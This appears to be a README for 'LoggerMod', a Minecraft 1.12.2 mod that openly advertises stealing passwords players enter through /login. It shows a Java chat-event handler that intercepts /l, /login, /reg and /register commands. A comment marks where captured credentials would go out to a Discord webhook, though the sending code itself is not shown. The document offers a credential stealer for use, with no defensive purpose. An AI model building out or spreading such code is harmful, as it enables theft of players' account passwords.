# 🔌 LoggerMod
This mod on 1.12.2 steals the entered passwords (Entered via /login)


# ⚡ How to configure?
You can easily change the config for yourself

# ❓ How it Works?
```java
    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            // Sending to your discord server use Webhook
        }
    }
``` 
